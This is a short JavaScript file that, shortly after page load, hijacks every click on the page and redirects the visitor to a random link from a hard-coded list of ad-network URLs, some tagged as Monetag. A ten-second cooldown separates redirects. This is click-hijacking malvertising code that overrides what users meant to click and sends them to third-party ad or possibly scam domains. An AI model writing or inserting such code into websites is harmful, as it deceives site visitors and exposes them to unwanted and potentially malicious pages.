function init() {
  var arr = [
    // mon: Lucy
    "https://grapseex.com/4/7683330",
    "https://grujeeroowie.com/4/7683322",
    "https://shulugoo.net/4/7683329",
    "https://coofoagleeh.com/4/7683328",
    "https://psutoupoo.net/4/7683327",
    // mon: Lucy
    "https://json.qrcreate.online",
    "https://dubzenom.com/4/7782127",

    // monetag: db
    "https://teksishe.net/4/7420698",
    "https://vaikijie.net/4/7237921",
    "https://aigheebsu.net/4/7420696",
    "https://groulrob.com/4/7237907",
    "https://fodsoack.com/4/7420689",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 10000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);